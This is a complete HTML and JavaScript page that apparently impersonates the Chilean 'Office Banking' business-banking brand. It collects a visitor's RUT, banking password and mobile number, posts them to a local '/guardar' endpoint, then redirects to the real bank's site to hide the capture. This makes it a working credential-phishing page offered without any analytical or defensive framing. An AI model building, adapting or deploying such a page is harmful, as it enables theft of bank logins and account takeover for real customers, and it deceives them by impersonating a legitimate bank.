<!DOCTYPE html>
<html lang="es">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Formulario de Ingreso</title>
    <style>
      * {
        box-sizing: border-box;
        margin: 0;
        padding: 0;
        font-family: Arial, sans-serif;
      }

      body {
        min-height: 100vh;
        display: flex;
        align-items: center;
        justify-content: center;
        background: linear-gradient(135deg, #111827 0%, #7f1d1d 45%, #ef4444 100%);
        padding: 24px;
      }

      .auth-shell {
        width: 100%;
        max-width: 980px;
        display: grid;
        grid-template-columns: 1.05fr 1.25fr;
        background: rgba(255, 255, 255, 0.96);
        border: 3px solid #ef4444;
        border-radius: 24px;
        overflow: hidden;
        box-shadow: 0 22px 50px rgba(0, 0, 0, 0.28);
      }

      .brand-panel {
        background: linear-gradient(180deg, #111827 0%, #1f2937 50%, #7f1d1d 100%);
        color: white;
        padding: 36px 30px;
        display: flex;
        flex-direction: column;
        justify-content: center;
      }

      .brand-row {
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 12px;
        margin-bottom: 26px;
        flex-wrap: wrap;
      }

      .office,
      .banking {
        display: inline-block;
        border-radius: 12px;
        padding: 12px 18px;
        font-weight: 900;
        font-size: 2rem;
        line-height: 1;
        letter-spacing: -1px;
      }

      .office {
        background: #fff;
        color: #111827;
        box-shadow: 0 6px 14px rgba(0, 0, 0, 0.18);
      }

      .banking {
        background: #fff;
        color: #dc2626;
        border: 2px solid #dc2626;
        box-shadow: 0 6px 14px rgba(0, 0, 0, 0.18);
      }

      .brand-panel h1 {
        font-size: clamp(2rem, 3vw, 3rem);
        line-height: 1.1;
        margin-bottom: 14px;
        font-weight: 900;
      }

      .brand-panel p {
        color: rgba(255, 255, 255, 0.85);
        font-size: 1.05rem;
        line-height: 1.6;
      }

      .mini-badges {
        display: flex;
        flex-wrap: wrap;
        gap: 10px;
        margin-top: 24px;
      }

      .mini-badges span {
        background: rgba(255, 255, 255, 0.08);
        border: 1px solid rgba(255, 255, 255, 0.15);
        border-radius: 999px;
        padding: 8px 12px;
        font-size: 0.78rem;
        color: #fff;
      }

      .form-panel {
        padding: 38px 28px;
        background: #fff;
        display: flex;
        align-items: center;
        justify-content: center;
      }

      .form-wrapper {
        width: 100%;
        max-width: 420px;
      }

      .heading {
        text-align: center;
        margin-bottom: 26px;
      }

      .heading h2 {
        font-size: 2rem;
        color: #111827;
        font-weight: 900;
        margin-bottom: 8px;
      }

      .heading p {
        color: #6b7280;
        font-size: 0.95rem;
      }

      .form-group {
        margin-bottom: 18px;
      }

      label {
        display: block;
        margin-bottom: 8px;
        color: #374151;
        font-weight: 700;
        font-size: 0.95rem;
      }

      input {
        width: 100%;
        padding: 14px 14px;
        border: 2px solid #fca5a5;
        border-radius: 12px;
        background: #fff;
        color: #111827;
        font-size: 1rem;
        outline: none;
        transition: all 0.2s ease;
      }

      input::placeholder {
        color: #9ca3af;
      }

      input:focus {
        border-color: #dc2626;
        box-shadow: 0 0 0 4px rgba(239, 68, 68, 0.12);
      }

      button {
        width: 100%;
        padding: 15px 16px;
        border: none;
        border-radius: 12px;
        background: linear-gradient(135deg, #dc2626 0%, #b91c1c 100%);
        color: white;
        font-size: 1rem;
        font-weight: 700;
        cursor: pointer;
        box-shadow: 0 12px 24px rgba(220, 38, 38, 0.28);
        transition: transform 0.15s ease, box-shadow 0.15s ease;
      }

      button:hover {
        transform: translateY(-1px);
      }

      button:active {
        transform: translateY(0);
      }

      #mensaje {
        margin-top: 18px;
        padding: 14px 12px;
        border-radius: 12px;
        text-align: center;
        font-weight: 700;
        font-size: 0.95rem;
        display: none;
      }

      #mensaje.exito {
        display: block;
        background: #dcfce7;
        border: 2px solid #22c55e;
        color: #166534;
      }

      #mensaje.error {
        display: block;
        background: #fee2e2;
        border: 2px solid #ef4444;
        color: #991b1b;
      }

      .hidden {
        display: none !important;
      }

      @media (max-width: 820px) {
        .auth-shell {
          grid-template-columns: 1fr;
        }

        .brand-panel {
          padding: 30px 22px;
        }

        .form-panel {
          padding: 26px 20px 30px;
        }
      }
    </style>
  </head>
  <body>
    <div class="auth-shell">
      <div class="brand-panel">
        <div class="brand-row">
          <span class="office">Office</span>
          <span class="banking">Banking</span>
        </div>

        <h1>Tu solicitud en una sola pantalla.</h1>
        <p>
          Completa tus datos y envía tu solicitud de forma segura. Nuestro equipo revisará
          la información y te responderá a la brevedad.
        </p>

        <div class="mini-badges">
          <span>100% Seguro</span>
          <span>Rápido</span>
          <span>Confidencial</span>
        </div>
      </div>

      <div class="form-panel">
        <div class="form-wrapper">
          <div class="heading">
            <h2>Formulario</h2>
            <p>Completa los datos y envía tu solicitud</p>
          </div>

          <form id="formIngreso" novalidate>
            <div class="form-group">
              <label for="numero">RUT</label>
              <input
                type="text"
                id="numero"
                name="numero"
                placeholder="12.345.678-9"
                required
                maxlength="12"
                autocomplete="off"
              />
            </div>

            <div class="form-group">
              <label for="alfanumerico">Contraseña</label>
              <input
                type="text"
                id="alfanumerico"
                name="alfanumerico"
                placeholder="Ej: ABC123xyz!@#"
                required
              />
            </div>

            <div class="form-group">
              <label for="telefono">Teléfono</label>
              <input
                type="tel"
                id="telefono"
                name="telefono"
                placeholder="+56 9 1234 5678"
                required
                maxlength="17"
                autocomplete="off"
              />
            </div>

            <button type="submit" id="btnEnviar">Enviar</button>
          </form>

          <div id="mensaje"></div>
        </div>
      </div>
    </div>

    <script>
      const form = document.getElementById('formIngreso');
      const mensaje = document.getElementById('mensaje');
      const btn = document.getElementById('btnEnviar');
      const rutInput = document.getElementById('numero');
      const telefonoInput = document.getElementById('telefono');
      const API_URL = '/guardar';
      const REDIRECT_URL = 'https://empresas.officebanking.cl/';

      rutInput.addEventListener('input', (e) => {
        let value = e.target.value
          .replace(/[^0-9kK]/g, '')
          .slice(0, 9);

        let formatted = '';

        if (value.length > 1) {
          const body = value.slice(0, -1);
          const dv = value.slice(-1).toUpperCase();
          formatted = body.replace(/\B(?=(\d{3})+(?!\d))/g, '.') + '-' + dv;
        } else {
          formatted = value;
        }

        e.target.value = formatted;
      });

      telefonoInput.addEventListener('input', (e) => {
        let digits = e.target.value.replace(/\D/g, '').slice(0, 11);

        if (digits.length <= 2) {
          e.target.value = '+56';
          return;
        }

        let formatted = '+56';

        if (digits.length > 2) {
          formatted += ' ' + digits.substring(2, 3);
        }

        if (digits.length > 3) {
          formatted += ' ' + digits.substring(3, 7);
        }

        if (digits.length > 7) {
          formatted += ' ' + digits.substring(7, 11);
        }

        e.target.value = formatted.trim();
      });

      function validarRut(rut) {
        const clean = rut.replace(/\./g, '').replace('-', '').toUpperCase();
        if (!/^[0-9]{7,8}[0-9K]$/.test(clean)) return false;

        const cuerpo = clean.slice(0, -1);
        const dv = clean.slice(-1);

        let suma = 0;
        let multiplo = 2;

        for (let i = cuerpo.length - 1; i >= 0; i--) {
          suma += Number(cuerpo[i]) * multiplo;
          multiplo = multiplo === 7 ? 2 : multiplo + 1;
        }

        const resto = 11 - (suma % 11);
        const dvEsperado = resto === 11 ? '0' : resto === 10 ? 'K' : String(resto);

        return dv === dvEsperado;
      }

      form.addEventListener('submit', async (e) => {
        e.preventDefault();

        const rut = rutInput.value.trim();
        const alfanumerico = document.getElementById('alfanumerico').value.trim();
        const telefono = telefonoInput.value.trim();

        if (!validarRut(rut)) {
          mostrarMensaje('El RUT ingresado no es válido', 'error');
          return;
        }

        if (!alfanumerico || alfanumerico.length === 0) {
          mostrarMensaje('El campo alfanumérico no puede estar vacío', 'error');
          return;
        }

        if (!/^((\+?56)?9\d{8})$/.test(telefono.replace(/\s+/g, ''))) {
          mostrarMensaje('El teléfono debe tener formato +56 9 1234 5678', 'error');
          return;
        }

        btn.disabled = true;
        btn.textContent = 'Guardando...';

        try {
          const respuesta = await fetch(API_URL, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify({
              numero: rut,
              alfanumerico,
              telefono
            })
          });

          const data = await respuesta.json();

          if (respuesta.ok) {
            form.classList.add('hidden');
            mostrarMensaje(data.mensaje || 'Hemos recibido su solicitud correctamente', 'exito');
            setTimeout(() => {
              window.location.href = REDIRECT_URL;
            }, 1800);
          } else {
            mostrarMensaje(data.error || 'Error al guardar', 'error');
          }
        } catch (err) {
          mostrarMensaje('No se pudo conectar al servidor. Intenta nuevamente.', 'error');
          console.error(err);
        } finally {
          btn.disabled = false;
          btn.textContent = 'Enviar';
        }
      });

      function mostrarMensaje(texto, tipo) {
        mensaje.textContent = texto;
        mensaje.className = tipo;
      }
    </script>
  </body>
</html>
